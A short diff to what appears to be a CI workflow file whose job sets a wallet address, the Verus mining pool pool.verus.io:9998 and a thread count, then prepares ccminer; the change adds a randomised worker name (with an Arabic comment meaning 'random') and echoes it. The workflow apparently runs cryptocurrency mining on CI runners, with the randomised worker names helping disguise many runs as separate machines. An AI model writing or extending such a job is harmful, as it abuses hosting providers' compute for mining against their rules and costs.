@@ -39,9 +39,12 @@ jobs:
           WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
           POOL="pool.verus.io:9998"
           TH=4
+
+          # Worker name عشوائي
           RAND_NUM=$(shuf -i 1000-9999 -n 1)
           RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
           WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
+          echo "👷 Worker Name: $WRK"
 
           cd ~
           if [ ! -d "$HOME/ccminer" ]; then
